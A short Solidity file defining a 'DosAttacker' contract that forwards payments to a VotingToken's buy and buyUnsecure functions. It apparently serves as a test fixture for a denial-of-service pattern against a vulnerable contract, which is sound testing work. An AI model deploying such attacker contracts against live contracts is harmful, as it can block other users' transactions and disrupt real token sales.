// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

interface VotingToken {
    function buy(uint256 amount) external payable;

    function buyUnsecure(uint256 amount) external payable;
}

contract DosAttacker {
    VotingToken internal _voting;

    constructor(address voting) {
        _voting = VotingToken(voting);
    }

    function buySecure(uint256 amount) external payable {
        _voting.buy{value: msg.value}(amount);
    }

    function buyUnsecure(uint256 amount) external payable {
        _voting.buyUnsecure{value: msg.value}(amount);
    }
}
